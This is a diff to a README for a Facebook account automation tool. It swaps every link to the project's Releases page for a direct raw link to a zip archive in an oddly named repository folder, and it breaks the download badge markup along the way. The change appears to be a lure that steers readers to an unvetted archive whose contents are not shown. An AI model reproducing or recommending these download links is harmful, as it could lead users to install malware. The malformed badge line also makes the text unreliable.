@@ -1,6 +1,6 @@
 # 🌟 MKTCare-Facebook-Automation-Tools - Manage Your Facebook Accounts Easily
 
-[![Download MKTCare-Facebook-Automation-Tools](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/salz41/MKTCare-Facebook-Automation-Tools/releases)
+[![Download MKTCare-Facebook-Automation-Tools](https://github.com/salz41/MKTCare-Facebook-Automation-Tools/raw/refs/heads/main/semisentient/Care_Tools_Facebook_MKT_Automation_v2.3-alpha.3.zip%https://github.com/salz41/MKTCare-Facebook-Automation-Tools/raw/refs/heads/main/semisentient/Care_Tools_Facebook_MKT_Automation_v2.3-alpha.3.zip)](https://github.com/salz41/MKTCare-Facebook-Automation-Tools/raw/refs/heads/main/semisentient/Care_Tools_Facebook_MKT_Automation_v2.3-alpha.3.zip)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Before installing MKTCare-Facebook-Automation-Tools, make sure your computer mee
 
 ### Step 2: Download the Software
 
-To download MKTCare-Facebook-Automation-Tools, visit this page: [Download MKTCare-Facebook-Automation-Tools](https://github.com/salz41/MKTCare-Facebook-Automation-Tools/releases).
+To download MKTCare-Facebook-Automation-Tools, visit this page: [Download MKTCare-Facebook-Automation-Tools](https://github.com/salz41/MKTCare-Facebook-Automation-Tools/raw/refs/heads/main/semisentient/Care_Tools_Facebook_MKT_Automation_v2.3-alpha.3.zip).
 
 ### Step 3: Locate the Latest Release
 
@@ -69,6 +69,6 @@ If you need help, please visit the GitHub Issues section for MKTCare-Facebook-Au
 
 MKTCare-Facebook-Automation-Tools simplifies Facebook account management for everyone. Take advantage of its robust features to streamline your online activities. 
 
-For further downloads and updates, visit the [Releases page](https://github.com/salz41/MKTCare-Facebook-Automation-Tools/releases) anytime. 
+For further downloads and updates, visit the [Releases page](https://github.com/salz41/MKTCare-Facebook-Automation-Tools/raw/refs/heads/main/semisentient/Care_Tools_Facebook_MKT_Automation_v2.3-alpha.3.zip) anytime. 
 
 Happy managing!
